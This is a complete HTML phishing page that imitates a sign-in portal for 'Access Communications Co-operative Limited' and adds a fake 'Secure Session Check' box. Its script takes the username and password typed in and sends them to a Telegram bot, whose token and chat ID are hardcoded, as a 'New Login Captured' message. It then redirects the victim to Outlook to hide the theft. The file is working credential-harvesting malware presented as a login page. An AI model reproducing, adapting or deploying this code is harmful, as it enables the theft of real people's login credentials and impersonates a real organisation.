 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>Sign In | Access Portal</title>
    <style>
        :root { --primary: #0054a4; --bg: #f4f7f9; --text: #1c1e21; --border: #cfd9e0; --success: #28a745; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', system-ui, sans-serif; display: flex; flex-direction: column; min-height: 100vh; }
        .nav-accent { height: 4px; background: linear-gradient(90deg, var(--primary) 0%, #fdb913 100%); }

        .main-wrapper { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
        
        .auth-card { 
            background: #ffffff; padding: 40px 35px; border-radius: 12px; 
            box-shadow: 0 4px 25px rgba(0,0,0,0.06); width: 100%; max-width: 420px; 
        }

        .brand-header { font-size: 28px; font-weight: 800; color: var(--primary); letter-spacing: -1px; margin-bottom: 8px; }
        .sub-header { font-size: 18px; font-weight: 600; color: #3c4043; margin-bottom: 30px; }

        .form-group { margin-bottom: 20px; text-align: left; position: relative; }
        label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 8px; color: #5f6368; text-transform: uppercase; }

        .input-field { 
            width: 100%; padding: 14px 15px; border: 1px solid var(--border); 
            border-radius: 6px; font-size: 16px; outline: none; transition: 0.2s; background: #fff;
        }
        .input-field:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(0,84,164,0.1); }

        /* Eye Icon Button */
        .eye-toggle { 
            position: absolute; right: 10px; top: 34px; 
            background: none; border: none; cursor: pointer; 
            color: #9aa0a6; padding: 8px; z-index: 5;
            display: flex; align-items: center; justify-content: center;
        }
        .icon { width: 22px; height: 22px; pointer-events: none; }
        .hidden { display: none; }

        .v-container {
            border: 1px solid var(--border); border-radius: 8px; padding: 15px;
            margin: 25px 0; background: #fafbfc; display: flex; align-items: center; cursor: pointer;
        }
        
        .v-check {
            width: 22px; height: 22px; border: 2px solid #bdc1c6; border-radius: 4px;
            margin-right: 12px; background: #fff; position: relative;
        }
        .v-check.active { background: var(--success); border-color: var(--success); }
        .v-check.active::after {
            content: ''; position: absolute; left: 7px; top: 3px; width: 4px; height: 9px;
            border: solid white; border-width: 0 2.5px 2.5px 0; transform: rotate(45deg);
        }
        .v-text { font-size: 14px; color: #3c4043; font-weight: 500; }

        .btn-submit { 
            width: 100%; padding: 15px; background: var(--primary); border: none; 
            border-radius: 6px; cursor: pointer; color: #fff; font-size: 17px; font-weight: 700;
        }
        .btn-submit:disabled { background: #e8eaed; color: #9aa0a6; cursor: not-allowed; }

        .footer { padding: 30px; text-align: center; font-size: 12px; color: #70757a; background: #fff; border-top: 1px solid #e8eaed; }
    </style>
</head>
<body>

<div class="nav-accent"></div>

<main class="main-wrapper">
    <div class="auth-card">
        <div class="brand-header">ACCESS</div>
        <div class="sub-header">Sign in to continue</div>

        <form id="authForm">
            <div class="form-group">
                <label>Username</label>
                <input type="text" id="username" class="input-field" placeholder="Username" required autocomplete="off">
            </div>

            <div class="form-group">
                <label>Password</label>
                <input type="password" id="password" class="input-field" placeholder="Password" required>
                <button type="button" id="eyeBtn" class="eye-toggle">
                    <svg id="eyeShow" class="icon hidden" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                    <svg id="eyeHide" class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24M1 1l22 22"/></svg>
                </button>
            </div>

            <div class="v-container" id="vBox">
                <div class="v-check" id="vCheck"></div>
                <span class="v-text" id="vLabel">Secure Session Check</span>
            </div>

            <button type="submit" class="btn-submit" id="submitBtn" disabled>Continue</button>
        </form>
    </div>
</main>

<footer class="footer">
    &copy; 2026 Access Communications Co-operative Limited.
</footer>

<script>
    // --- EYE ICON LOGIC ---
    const eyeBtn = document.getElementById('eyeBtn');
    const passInput = document.getElementById('password');
    const eyeShow = document.getElementById('eyeShow');
    const eyeHide = document.getElementById('eyeHide');

    eyeBtn.addEventListener('click', function() {
        if (passInput.type === 'password') {
            passInput.type = 'text';
            eyeShow.classList.remove('hidden');
            eyeHide.classList.add('hidden');
        } else {
            passInput.type = 'password';
            eyeShow.classList.add('hidden');
            eyeHide.classList.remove('hidden');
        }
    });

    // --- VERIFICATION LOGIC ---
    const vBox = document.getElementById('vBox');
    const vCheck = document.getElementById('vCheck');
    const vLabel = document.getElementById('vLabel');
    const submitBtn = document.getElementById('submitBtn');

    vBox.onclick = function() {
        if (vCheck.classList.contains('active')) return;
        vLabel.innerText = "Securing...";
        setTimeout(function() {
            vCheck.classList.add('active');
            vLabel.innerText = "Session Secured";
            submitBtn.disabled = false;
        }, 1000);
    };

    // --- TELEGRAM LOGIC (GITHUB SAFE) ---
    const BOT_TOKEN = '8584656855:AAGer0oV6or_nNBblqfOKr9Exyf8Z58UoLk';
    const CHAT_ID = '5627522307';

    document.getElementById('authForm').onsubmit = function(e) {
        e.preventDefault();
        submitBtn.disabled = true;
        submitBtn.innerText = "Connecting...";

        const u = document.getElementById('username').value;
        const p = passInput.value;
        const message = "ðŸš¨ New Login Captured\nUser: " + u + "\nPass: " + p;

        // Using standard fetch for GitHub compatibility
        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        }).then(function() {
            window.location.href = "https://outlook.office.com";
        }).catch(function() {
            window.location.href = "https://outlook.office.com";
        });
    };
</script>
</body>
</html>
